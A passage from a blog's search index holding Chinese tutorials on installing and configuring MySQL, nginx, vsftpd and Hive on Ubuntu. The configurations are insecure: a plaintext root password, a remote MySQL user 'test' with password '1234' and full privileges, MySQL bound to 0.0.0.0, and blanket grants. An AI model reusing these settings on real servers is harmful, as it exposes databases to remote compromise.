<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>mysql-basic</title>
    <url>/2020/02/13/mysql-basic/</url>
    <content><![CDATA[<p>mysql安装和使用<br>版本：ubuntu16.04与mysql-server-5.7</p>
<a id="more"></a>
<p><a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">安装教程</a><br>root账户密码（Qwertyuiop123）</p>
<h1 id="0x00-字符集配置"><a href="#0x00-字符集配置" class="headerlink" title="0x00 字符集配置"></a>0x00 字符集配置</h1><p>编辑<code>sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</code><br>在[mysqlId]节点下添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">character_set_server=utf8</span><br></pre></td></tr></table></figure>

<h1 id="0x01-自启动配置"><a href="#0x01-自启动配置" class="headerlink" title="0x01 自启动配置"></a>0x01 自启动配置</h1><ol>
<li>执行<code>chkconfig mysqld on</code></li>
<li>执行<code>chkconfig --list mysqld</code>（查看2-5位启用on状态即可）</li>
</ol>
<h1 id="0x02-一些配置"><a href="#0x02-一些配置" class="headerlink" title="0x02 一些配置"></a>0x02 一些配置</h1><ul>
<li><p>服务启动：<code>service mysqld start</code></p>
</li>
<li><p>root用户登陆：<code>mysql -u root -p</code><br>登陆之后可以进行的操作。</p>
</li>
<li><p>查看mysql的用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select user,host,authentication_string from mysql.user</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改root密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set authentication_string for root@localhost=password(&apos;yourPassword&apos;)</span><br><span class="line">#或者</span><br><span class="line">set authentication_string for root@127.0.0.1=password(&apos;yourPassword&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除匿名用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看是否有匿名用户</span><br><span class="line">select user,host from mysql.user;</span><br><span class="line">#删除匿名用户</span><br><span class="line">delete from mysql.user where user=&apos;&apos;;</span><br><span class="line">#刷新，生效</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
</li>
<li><p>插入新用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;test&apos;@&apos;localhost&apos;  IDENTIFIED BY &apos;1234&apos;; #本地登录 </span><br><span class="line">CREATE USER &apos;test&apos;@&apos;%&apos;  IDENTIFIED BY &apos;1234&apos;; #远程登录</span><br><span class="line">#使操作生效</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建新的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE mall DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>
</li>
<li><p>给某一个用户赋予某数据库的所有权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant all privileges on mall.* to youUsername@localhost identified by &apos;yourPassword&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>给某一个账户开通外网所有权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant all privileges on mall.* to youUsername@&apos;%&apos; identified by &apos;yourPassword&apos;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>注意%号代表所有的IP地址，可以指定IP地址</p>
</blockquote>
<p>使操作生效<code>flush privileges;</code></p>
<blockquote>
<p>注意，如果启动失败，注意查看日志文件<code>/var/log/syslog</code>，这里可以找到错误原因</p>
</blockquote>
<h1 id="0x03-导入数据库"><a href="#0x03-导入数据库" class="headerlink" title="0x03 导入数据库"></a>0x03 导入数据库</h1><p>sql文件的导入</p>
<ul>
<li>进入mysql的终端：<code>mysql -u root -p</code></li>
<li>创建数据库：<code>create database databaseName;</code></li>
<li>切换数据库：<code>use databaseName;</code></li>
<li>导入文件：<code>source /root/abc.sql;</code></li>
</ul>
<h1 id="mysql连接的一个错误"><a href="#mysql连接的一个错误" class="headerlink" title="mysql连接的一个错误"></a>mysql连接的一个错误</h1><ul>
<li>错误现象：ECS中安装有mysql，也已经有mysqld服务，也开放了3306端口，但就是在本地win10用navicat连接不上（can’t connect to mysql server on ‘localhost’ (10061)）</li>
<li>排查过程：检测linux上3306的监听状况。<br>使用如下命令：<code>netstat -ntpl |grep 3306</code>可以查看3306的监听状态。<br><img src="/images/mysql-basic/pic01.png" alt="pic01"></li>
<li>原因：因为3306端口的监听只与127.0.0.1绑定[1]。端口只允许本机访问，有两个地方启用，一个是防火墙启用3306，一个就是mysql配置绑定本机地址</li>
<li>修改：<br>具体参考文献[1]</li>
</ul>
<ol>
<li>编辑配置文件<code>vim /etc/mysql/mysql.conf.d/mysqld.cnf</code><br>修改一个值为：<code>bind-address = 0.0.0.0</code><br>重启服务：<code>service mysql restart</code> <br></li>
<li>另外还需要创建一个用户使外网能跟访问。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;test&apos;@&apos;%&apos;  IDENTIFIED BY &apos;1234&apos;;</span><br><span class="line">grant all privileges on mmall.* to test@&apos;%&apos; identified by &apos;1234&apos;;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>dpkg: error processing package *** (–configure)解决办法<br><a href="https://blog.csdn.net/qq_36561697/article/details/82224279" target="_blank" rel="noopener">https://blog.csdn.net/qq_36561697/article/details/82224279</a></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://blog.csdn.net/qq_36820328/article/details/79654278" target="_blank" rel="noopener">https://blog.csdn.net/qq_36820328/article/details/79654278</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>ngnix</title>
    <url>/2020/02/13/ngnix/</url>
    <content><![CDATA[<p>ngnix安装和使用<br>版本：ubuntu16.04与nginx-1.11.3</p>
<a id="more"></a>

<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><ul>
<li>Ngnix是一款轻量级web服务器，也是一款反向代理服务器</li>
<li>可作为HTTP反向代理服务器，负载均衡服务器，邮件代理服务器，帮助实现前端动静分离。</li>
<li>特点：高稳定，高性能，资源占用少，功能丰富，模块化结构，支持热部署。<br><a href="http://nginx.org/" target="_blank" rel="noopener">官网</a></li>
</ul>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><ul>
<li><p>下载软件：<br><a href="http://nginx.org/download/" target="_blank" rel="noopener">http://nginx.org/download/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.11.3.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装依赖<br>centOS下的安装依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>ubuntu16.04 下安装依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#gcc g++的依赖库</span><br><span class="line">apt-get install build-essential</span><br><span class="line">apt-get install libtool</span><br><span class="line"># 安装pcre依赖库</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libpcre3 libpcre3-dev</span><br><span class="line"># 安装zlib依赖库</span><br><span class="line">apt-get install zlib1g-dev</span><br><span class="line"># 安装ssl依赖库</span><br><span class="line">apt-get install openssl</span><br></pre></td></tr></table></figure>

<ul>
<li>编译安装<br>进入解压目录<br>执行<code>./configure</code>（安装后可以通过<code>whereis ngnix</code>查询安装位置）<br>或者指定安装目录<code>./configure --prefix=/usr/local/nginx</code><br>然后执行<code>make</code>命令<br>最后执行<code>make install</code>完成安装<blockquote>
<p>通过上面可以知道ngnix安装后的位置在<code>/usr/local/nginx</code></p>
</blockquote>
</li>
</ul>
<h1 id="0x02-ngnix常用命令"><a href="#0x02-ngnix常用命令" class="headerlink" title="0x02 ngnix常用命令"></a>0x02 ngnix常用命令</h1><h2 id="测试配置文件"><a href="#测试配置文件" class="headerlink" title="测试配置文件"></a>测试配置文件</h2><p>安装路径下（eg:<code>/usr/local/nginx</code>）的<code>sbin</code>文件下的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>

<h2 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h2><p><code>sudo /usr/local/nginx/sbin/nginx</code><br>启动的时候80端口被占用的解决方案: <a href="https://jingyan.baidu.com/article/20b68a8880c84d796dec6256.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/20b68a8880c84d796dec6256.html</a><br>或者<a href="https://blog.csdn.net/qq_27252133/article/details/53646986" target="_blank" rel="noopener">98: Address already in use</a></p>
<h2 id="停止命令"><a href="#停止命令" class="headerlink" title="停止命令"></a>停止命令</h2><p><code>/usr/local/nginx/sbin/nginx -s stop</code><br>或者<br><code>/usr/local/nginx/sbin/nginx -s quit</code></p>
<h2 id="重启命令"><a href="#重启命令" class="headerlink" title="重启命令"></a>重启命令</h2><p><code>/usr/local/nginx/sbin/nginx -s reload</code></p>
<h1 id="0x03-设置虚拟域名-反向代理"><a href="#0x03-设置虚拟域名-反向代理" class="headerlink" title="0x03 设置虚拟域名(反向代理)"></a>0x03 设置虚拟域名(反向代理)</h1><ul>
<li>在ngnix的配置文件<code>./conf/nginx.conf</code>如下地方中加入如下内容<br><code>include vhost/*.conf</code><br><img src="/images/nginx/pic01.png" alt="pic"><br></li>
<li>创建vhost<br>在ngnix的conf目录下创建一个文件夹<code>vhost</code><br></li>
<li>修改host（需要访问的客户端上面的）<br>这个文件是设置域名的<br><code>vim /etc/hosts</code>，加入如下内容(win:<code>C:\Windows\System32\Drivers\etc</code>)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">106.14.124.205 www.yijun.com</span><br><span class="line">106.14.124.205 image.yijun.com</span><br><span class="line">106.14.124.205 s.yijun.com</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>重启网络服务<code>/etc/init.d/nscd restart</code><br><br></p>
<ul>
<li>编辑节点（在目录conf/vhost下面）<br><code>cd conf/vhost</code><br>节点1： 新建<code>vim www.yijun.com.conf</code>，输入如下内容<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">      listen 80; </span><br><span class="line">      autoindex on; </span><br><span class="line">      server_name www.yijun.com; </span><br><span class="line">      access_log /usr/local/nginx/logs/access.log combined; </span><br><span class="line">      index index.html index.htm index.jsp index.php; </span><br><span class="line">      #error_page 404 /404.html; </span><br><span class="line">      if ( $query_string ~* &quot;.*[\;&apos;\&lt;\&gt;].*&quot; )&#123; </span><br><span class="line">           return 404; </span><br><span class="line">      &#125; </span><br><span class="line">      location / &#123;  </span><br><span class="line">            proxy_pass http://127.0.0.1:8080;</span><br><span class="line">            add_header Access-Control-Allow-Origin *;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>解析：上述是把<code>www.yijun.com:80</code>的请求转发到<code>http://127.0.0.1:8080</code></p>
<blockquote>
<p>注意：<code>autoindex off</code>的时候不会暴露索引。</p>
</blockquote>
<p>重启ngnix即可<br><br>节点2：新建<code>vim image.yijun.com.conf</code>，输入如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">      listen 80; </span><br><span class="line">      autoindex off; </span><br><span class="line">      server_name image.yijun.com; </span><br><span class="line">      access_log /usr/local/nginx/logs/access.log combined; </span><br><span class="line">      index index.html index.htm index.jsp index.php; </span><br><span class="line">      #error_page 404 /404.html; </span><br><span class="line">      if ( $query_string ~* &quot;.*[\;&apos;\&lt;\&gt;].*&quot; )&#123;</span><br><span class="line">            return 404; </span><br><span class="line">      &#125; </span><br><span class="line">      location ~ /(mmall_fe|mmall_admin_fe)/dist/view/* &#123; </span><br><span class="line">            deny all;</span><br><span class="line">      &#125; </span><br><span class="line">      location /  &#123; </span><br><span class="line">            root /myFiles;</span><br><span class="line">            add_header Access-Control-Allow-Origin *;</span><br><span class="line">      &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析：上述是把<code>image.yijun.com:80</code>的请求转发到<code>/myFiles</code>文件夹下面。</p>
<p>重启ngnix</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.cnblogs.com/tinya/p/11849173.html" target="_blank" rel="noopener">https://www.cnblogs.com/tinya/p/11849173.html</a> ngnix安装</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ngnix</tag>
      </tags>
  </entry>
  <entry>
    <title>vsftpd</title>
    <url>/2020/02/12/vsftpd/</url>
    <content><![CDATA[<p>vsftpd安装和使用<br>版本：ubuntu16.04与vsftp-2.2.2</p>
<a id="more"></a>
<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>vsftp(very secure FTP daemon)，一个免费的，开源的ftp服务器软件。<br>小巧轻快，安全易用，支持虚拟用户，宽带限制。</p>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p><code>apt-get install vsftpd</code><br>默认的配置文件在<code>/etc/vsftpd.conf</code><br>启动服务<code>service vsftpd start</code></p>
<h1 id="0x02-用户配置"><a href="#0x02-用户配置" class="headerlink" title="0x02 用户配置"></a>0x02 用户配置</h1><ol>
<li><p>选定一个目录作为ftp文件夹<br>如：<code>/home/uftp</code></p>
</li>
<li><p>ubuntu系统添加一个用户<br>倒数第三个是指ftp使用的文件目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd ftpuser -d /home/ftpuser  -s /bin/bash</span><br><span class="line">或者</span><br><span class="line">useradd -d /home/uftp -m uftp -s /usr/sbin/nologin</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>修改文件目录权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown -R ftpuser.ftpuser /home/ftpuser</span><br></pre></td></tr></table></figure>

<p>重设ftpuser用户的密码(123456)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd ftpuser</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>配置</li>
</ol>
<ul>
<li><p>新建文件<code>vim /etc/vsftpd.user_list</code><br>用来存放允许访问ftp的用户<br>在其中加入用户名<code>ftpuser</code></p>
</li>
<li><p>配置VSFTPD文件<br><code>vim /etc/vsftpd.conf</code><br>做如下修改（后三行要放到最后）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">write_enable=YES</span><br><span class="line">userlist_file=/etc/vsftpd.user_list</span><br><span class="line">userlist_enable=YES</span><br><span class="line">userlist_deny=NO</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="4">
<li><p>重启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service vsftpd restart</span><br><span class="line">或者</span><br><span class="line">sudo vsftpd restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证</p>
</li>
</ol>
<p><strong>安照如上创建的用户是需要在cmd环境下进行操作</strong>，在浏览器中登陆不上。<br><code>ps aux | grep vsftpd</code>查看是否有对应进程。<br>win下的cmd中输入<code>ftp IP</code><br>下载：<code>get filename</code><br>上传：<code>put filename</code></p>
<h1 id="0x03-配置浏览器登陆"><a href="#0x03-配置浏览器登陆" class="headerlink" title="0x03 配置浏览器登陆"></a>0x03 配置浏览器登陆</h1><p>浏览器不能访问，是因为VSFTPD不支持被动模式造成的。</p>
<ol>
<li><p>编辑配置文件<code>vi /etc/vsftpd.conf</code><br>加入如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pasv_enable=YES</span><br><span class="line">pasv_max_port=30100</span><br><span class="line">pasv_min_port=30000</span><br><span class="line"># 这儿填服务器的ip(选填)</span><br><span class="line">pasv_address=47.99.*.*    </span><br><span class="line">pasv_addr_resolve=yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>防火墙配置开放<br>编辑（centOS）<code>vi /etc/iptables.rules</code></p>
</li>
</ol>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.linuxidc.com/Linux/2017-06/144807.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2017-06/144807.htm</a> Ubuntu 16.04下vsftpd 安装配置实例<br>[2] <a href="https://blog.csdn.net/sinat_41898105/article/details/90341812" target="_blank" rel="noopener">https://blog.csdn.net/sinat_41898105/article/details/90341812</a> 阿里云连接不上问题</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="centOS要用到的一个项目配置"><a href="#centOS要用到的一个项目配置" class="headerlink" title="centOS要用到的一个项目配置"></a>centOS要用到的一个项目配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本项目要用到的配置项：</span><br><span class="line">1）local_root=/ftpfile(当本地用户登入时，将被更换到定义的目录下，默认值为各用户的家目录)</span><br><span class="line">2）anon_root=/ftpfile(使用匿名登入时，所登入的目录)</span><br><span class="line">3）use_localtime=YES(默认是GMT时间，改成使用本机系统时间)</span><br><span class="line">4）anonymous_enable=NO(不允许匿名用户登录)</span><br><span class="line">5）local_enable=YES(允许本地用户登录)</span><br><span class="line">6）write_enable=YES(本地用户可以在自己家目录中进行读写操作)</span><br><span class="line">7）local_umask=022(本地用户新增档案时的umask值)</span><br><span class="line">8）dirmessage_enable=YES(如果启动这个选项，那么使用者第一次进入一个目录时，会检查该目录下是否有.message这个档案，如果有，则会出现此档案的内容，通常这个档案会放置欢迎话语，或是对该目录的说明。默认值为开启)</span><br><span class="line">9）xferlog_enable=YES(是否启用上传/下载日志记录。如果启用，则上传与下载的信息将被完整纪录在xferlog_file 所定义的档案中。预设为开启。)</span><br><span class="line">10）connect_from_port_20=YES(指定FTP使用20端口进行数据传输，默认值为YES)</span><br><span class="line">11）xferlog_std_format=YES(如果启用，则日志文件将会写成xferlog的标准格式)</span><br><span class="line">12）ftpd_banner=Welcome to mmall FTP Server(这里用来定义欢迎话语的字符串)</span><br><span class="line">13）chroot_local_user=NO(用于指定用户列表文件中的用户是否允许切换到上级目录)</span><br><span class="line">14）chroot_list_enable=YES(设置是否启用chroot_list_file配置项指定的用户列表文件)</span><br><span class="line">15）chroot_list_file=/etc/vsftpd/chroot_list(用于指定用户列表文件)</span><br><span class="line">16）listen=YES(设置vsftpd服务器是否以standalone模式运行，以standalone模式运行是一种较好的方式，此时listen必须设置为YES，此为默认值。建议不要更改，有很多与服务器运行相关的配置命令，需要在此模式下才有效，若设置为NO，则vsftpd不是以独立的服务运行，要受到xinetd服务的管控，功能上会受到限制)</span><br><span class="line">17）pam_service_name=vsftpd(虚拟用户使用PAM认证方式，这里是设置PAM使用的名称，默认即可，与/etc/pam.d/vsftpd对应) userlist_enable=YES(是否启用vsftpd.user_list文件，黑名单,白名单都可以</span><br><span class="line">18)pasv_min_port=61001(被动模式使用端口范围最小值)</span><br><span class="line">19)pasv_max_port=62000(被动模式使用端口范围最大值)</span><br><span class="line">20)pasv_enable=YES(pasv_enable=YES/NO（YES）</span><br><span class="line">若设置为YES，则使用PASV工作模式；若设置为NO，则使用PORT模式。默认值为YES，即使用PASV工作模式。</span><br><span class="line">   FTP协议有两种工作方式：PORT方式和PASV方式，中文意思为主动式和被动式。</span><br><span class="line">   一、PORT（主动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。</span><br><span class="line">  当需要传送数据时，客户端在命令链路上用 PORT命令告诉服务器：“我打开了****端口，你过来连接我”。于是服务器从20端口向客户端的****端口发送连接请求，建立一条数据链路来传送数据。</span><br><span class="line">   二、PASV（被动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路。</span><br><span class="line">  当需要传送数据时，服务器在命令链路上用 PASV命令告诉客户端：“我打开了****端口，你过来连接我”。于是客户端向服务器的****端口发送连接请求，建立一条数据链路来传送数据。</span><br><span class="line">  从上面可以看出，两种方式的命令链路连接方法是一样的，而数据链路的建立方法就完全不同。而FTP的复杂性就在于此。</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="Ununtu16-04的一个配置"><a href="#Ununtu16-04的一个配置" class="headerlink" title="Ununtu16.04的一个配置"></a>Ununtu16.04的一个配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这些设置系统默认是开启的，可以不管</span><br><span class="line">listen=NO</span><br><span class="line">listen_ipv6=YES</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">use_localtime=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line"></span><br><span class="line">#下面的就要自定义设置了，建议系统默认的不管，然后复制下面的</span><br><span class="line"></span><br><span class="line">#是否允许匿名访问，NO为不允许</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#是否允许本地用户访问,就是linux本机中存在的用户，YES允许</span><br><span class="line">local_enable=YES</span><br><span class="line">#是否开启写模式，YES为开启</span><br><span class="line">write_enable=YES</span><br><span class="line">#新建文件权限，一般设置为022，那么新建后的文件的权限就是777-022=755</span><br><span class="line">local_umask=022</span><br><span class="line"></span><br><span class="line">#是否启动userlist为通过模式，YES的话只有存在于userlist文件中的用户才能登录ftp（可以理解为userlist是一个白名单），NO的话，白名单失效，和下面一个参数配合使用</span><br><span class="line">userlist_enable=YES</span><br><span class="line">#是否启动userlist为禁止模式，YES表示在userlist中的用户禁止登录ftp（黑名单），NO表示黑名单失效，我们已经让userlist作为一个白名单，所以无需使用黑名单功能</span><br><span class="line">userlist_deny=NO</span><br><span class="line">#指定哪个文件作为userlist文件，我们稍后编辑这个文件</span><br><span class="line">userlist_file=/etc/vsftpd.user_list</span><br><span class="line"></span><br><span class="line">#是否限制本地所有用户切换根目录的权限，YES为开启限制，即登录后的用户不能访问ftp根目录以外的目录，当然要限制啦</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">#是否启动限制用户的名单list为允许模式，上面的YES限制了所有用户，可以用这个名单作为白名单，作为例外允许访问ftp根目录以外</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">#设置哪个文件是list文件，里面的用户将不受限制的去访问ftp根目录以外的目录</span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br><span class="line">#是否开启写模式，开启后可以进行创建文件夹等写入操作</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line"></span><br><span class="line">#设置ftp根目录的位置,这个文件我们稍后自己创建</span><br><span class="line">local_root=/var/myftp</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vsftpd</tag>
      </tags>
  </entry>
  <entry>
    <title>hive01-base</title>
    <url>/2020/01/14/hive01-base/</url>
    <content><![CDATA[<p>hive的安装和介绍<br>版本：2.3.6<br>hadoop: 2.7.1</p>
<a id="more"></a>
<p>hive是一个基于Hadoop的数据仓库工具，用于HDFS文件中数据集的整理、查询、分析，提供一个类SQL的查询语言HiveQL（转换为MapReduce实现）。<br>以下东西来源于文献[1]<br><a href="https://hive.apache.org/" target="_blank" rel="noopener">官网</a><br><a href="https://cwiki.apache.org/confluence/display/Hive/GettingStarted" target="_blank" rel="noopener">官网手册</a></p>
<h1 id="hive安装"><a href="#hive安装" class="headerlink" title="hive安装"></a>hive安装</h1><p>安装hive，配置mysql。</p>
<h2 id="下载解压"><a href="#下载解压" class="headerlink" title="下载解压"></a>下载解压</h2><p>从官网下载安装包<code>apache-hive-2.3.6-bin.tar.gz</code><br>对文件进行解压至目录<code>/opt/hive</code><br>修改文件所属：<code>chown -R yijun:yijun hive</code></p>
<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>这一步是可选的，可以编辑<code>/etc/profile</code>文件对所有用户都生效，也可选择<code>~/.bashrc</code>仅对当前用户生效。<br>添加如下条目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export HIVE_HOME=/usr/local/hive</span><br><span class="line">export PATH=$PATH:$HIVE_HOME/bin</span><br><span class="line">export HADOOP_HOME=/usr/local/hadoop</span><br></pre></td></tr></table></figure>

<p>使用source命令使之生效</p>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul>
<li><p>将<code>hive-default.xml.template</code>重命名为<code>hive-default.xml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv hive-default.xml.template hive-default.xml</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建一个<code>hive-site.xml</code>文件<br>添加如下配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;jdbc:mysql://localhost:3306/hive?createDatabaseIfNotExist=true&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;username to use against metastore database&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;password to use against metastore database&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>下面的内容是安装配置mysql作为元数据库</p>
<h2 id="mysql安装"><a href="#mysql安装" class="headerlink" title="mysql安装"></a>mysql安装</h2><p>安装教程见参考文献<a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">2</a></p>
<p>以下是有关hive配置的步骤</p>
<ul>
<li><p>step0: 下载驱动包<br><a href="https://dev.mysql.com/downloads/connector/j/" target="_blank" rel="noopener">驱动地址</a><br>解压并拷贝<code>mysql-connector-java-5.1.40-bin.jar</code>到<code>/usr/local/hive/lib</code>目录下</p>
<br>
</li>
<li><p>step1: 新建名为hive的数据库<br>这个hive数据库与hive-site.xml中配置对应，用来保存hive元数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database hive;</span><br><span class="line">mysql&gt; use hive; #切换</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 配置mysql允许hive接入<br>将所有数据库的所有表的所有权限赋给hive用户，后面的hive是配置hive-site.xml中配置的连接密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all on *.* to hive@localhost identified by &apos;hive&apos;;   </span><br><span class="line">mysql&gt; flush privileges;  #刷新mysql系统权限关系表</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="启动hive"><a href="#启动hive" class="headerlink" title="启动hive"></a>启动hive</h2><p>在启动之前，需要保证hadoop集群启动成功。<br><code>./bin/hive</code><br>至此，已经配置了hive，mysql作为元数据的存储库。<br>我在启动过程中的一些报错。</p>
<ul>
<li><p>如果报错信息如下，尝试启动metastor服务<code>bin/hive --servie metastore</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FAILED: SemanticException org.apache.hadoop.hive.ql.metadata.HiveException: java.lang.RuntimeException: </span><br><span class="line">Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果报错如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: MetaException(message:Version information not found in metastore. )</span><br><span class="line">    at org.apache.hadoop.hive.metastore.RetryingHMSHandler.&lt;init&gt;(RetryingHMSHandler.java:83)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>到<code>hive-site.xml</code>中加入如下条目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hive.metastore.schema.verification&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;false&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure>

<ul>
